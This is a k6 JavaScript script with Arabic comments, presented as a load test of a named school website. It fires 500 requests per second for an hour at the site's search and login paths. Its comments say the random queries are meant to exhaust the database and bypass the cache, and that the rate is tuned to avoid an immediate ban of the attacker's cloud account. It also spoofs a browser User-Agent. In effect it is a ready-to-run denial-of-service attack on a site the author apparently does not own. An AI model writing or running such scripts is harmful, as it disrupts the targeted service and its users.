import http from 'k6/http';

export const options = {
  scenarios: {
    advanced_load_test: {
      executor: 'constant-arrival-rate',
      rate: 500,           // معدل متوازن ومستمر لضمان عدم حظر الحساب السحابي فوراً
      timeUnit: '1s',
      duration: '1h',       // مدة الاختبار ساعة كاملة لمراقبة استقرار الخادم
      preAllocatedVUs: 200, // مستخدمون وهميون مخصصون مسبقاً لتفادي تأخير النظام
      maxVUs: 1000,
    },
  },
};

const BASE_URL = 'https://hadjischool.com';

export default function () {
  // توليد كلمات بحث فريدة وعشوائية لإنهاك قاعدة البيانات وتخطي الكاش
  const uniqueQuery = Math.random().toString(36).substring(2, 10) + Date.now();
  
  // استهداف مسار البحث الداخلي ومسار تسجيل الدخول بالتوازي
  const searchUrl = `${BASE_URL}/?s=${uniqueQuery}`;
  const loginUrl = `${BASE_URL}/login?auth_ref=${uniqueQuery}`;
  
  const requestHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
  };

  // إرسال الطلبات بالتوازي عبر تقنية الباتش لمعاينة قدرة الـ Triage في الخادم
  http.batch([
    ['GET', searchUrl, null, { headers: requestHeaders, timeout: '4s' }],
    ['POST', loginUrl, JSON.stringify({ user: `test_${uniqueQuery}`, pass: `pass_${uniqueQuery}` }), { headers: Object.assign({}, requestHeaders, { 'Content-Type': 'application/json' }), timeout: '4s' }]
  ]);
}
